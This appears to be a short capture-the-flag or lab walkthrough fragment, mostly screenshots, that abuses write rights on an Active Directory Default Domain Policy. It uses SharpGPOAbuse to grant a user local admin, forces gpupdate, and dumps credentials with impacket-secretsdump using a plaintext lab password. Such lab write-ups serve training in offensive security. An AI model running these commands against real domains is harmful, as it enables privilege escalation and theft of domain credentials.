
![Pasted image 20240727200619.png](Evidence/Pasted%20image%2020240727200619.png)

so Anirudh has generic write permissions on the default domain policy 

![Pasted image 20240727205855.png](Evidence/Pasted%20image%2020240727205855.png)

![Pasted image 20240727210006.png](Evidence/Pasted%20image%2020240727210006.png)

![Pasted image 20240727210308.png](Evidence/Pasted%20image%2020240727210308.png)

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
```

![Pasted image 20240727210321.png](Evidence/Pasted%20image%2020240727210321.png)

```
gpupdate /force
```

![Pasted image 20240727210420.png](Evidence/Pasted%20image%2020240727210420.png)

![Pasted image 20240727210517.png](Evidence/Pasted%20image%2020240727210517.png)

```
impacket-secretsdump vault.offsec/anirudh:SecureHM@TARGET

```

![Pasted image 20240727211209.png](Evidence/Pasted%20image%2020240727211209.png)

![Pasted image 20240727211224.png](Evidence/Pasted%20image%2020240727211224.png)

![Pasted image 20240727211309.png](Evidence/Pasted%20image%2020240727211309.png)

